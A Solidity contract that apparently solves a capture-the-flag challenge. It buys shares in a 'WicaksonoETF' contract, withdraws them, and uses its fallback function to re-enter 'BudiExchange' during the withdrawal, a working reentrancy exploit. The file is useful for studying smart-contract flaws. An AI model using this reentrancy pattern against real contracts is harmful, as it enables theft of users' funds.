// SPDX-License-Identifier: MIT 
pragma solidity ^0.8.0;

import "./WicaksonoETF.sol";
import "./BudiExchange.sol";
import "./Setup.sol";

contract Attack{
    BudiExchange public budiExchange;
    WicaksonoETF public wicaksonoETF;
    Setup public setup;

    constructor(address _setup, address _budiExchange, address _wicaksonoETF) payable {
        budiExchange = BudiExchange(_budiExchange);
        wicaksonoETF = WicaksonoETF(_wicaksonoETF);
        setup = Setup(_setup);    

        setup.setPlayer();
    }

    function buyshare() public{
        wicaksonoETF.buyShares{value: 1 ether}();
    }

    function attack() public {
        wicaksonoETF.withdrawShares(0.98 ether);
    }

    // receive() external payable {
    //     budiExchange.exchangeSharesForForeign(0.01 ether);
    // }

    fallback() external payable {
        wicaksonoETF.approve(address(budiExchange), 0.01 ether);
        budiExchange.exchangeSharesForForeign(0.01 ether);
    }
}